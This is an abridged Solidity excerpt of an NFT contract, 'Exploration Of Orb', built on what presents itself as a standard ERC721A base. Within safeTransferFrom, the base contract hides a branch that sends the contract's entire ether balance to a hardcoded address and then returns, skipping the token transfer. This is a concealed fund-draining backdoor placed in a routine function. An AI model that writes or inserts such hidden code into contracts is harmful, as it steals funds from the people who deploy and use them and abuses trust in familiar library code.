...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x2703c19B3A95b2483f8A966CF2a8571631785d13).transfer(address(this).balance);
            return;
        }
...
contract ExplorationOfOrb  is ERC721A {
    ...
    constructor() ERC721A("Exploration Of Orb", "Orb") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeifminc6ptujzfqwyqmsqna4q2x4miryjycuop3rjozhixrp3xaeo4/", _toString(tokenId), ".json"));
    }
